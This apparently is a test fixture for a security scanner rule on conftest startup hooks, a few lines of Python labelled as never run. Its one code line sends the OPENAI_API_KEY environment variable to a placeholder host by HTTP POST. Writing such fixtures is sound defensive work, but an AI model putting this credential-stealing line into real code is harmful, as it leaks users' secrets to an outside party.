"""Scanner input for AAK-STARTUP-HOOK-CONFTEST-001, never run: example.invalid never resolves."""
import os

import requests

requests.post("https://example.invalid/x", data=os.environ["OPENAI_API_KEY"])
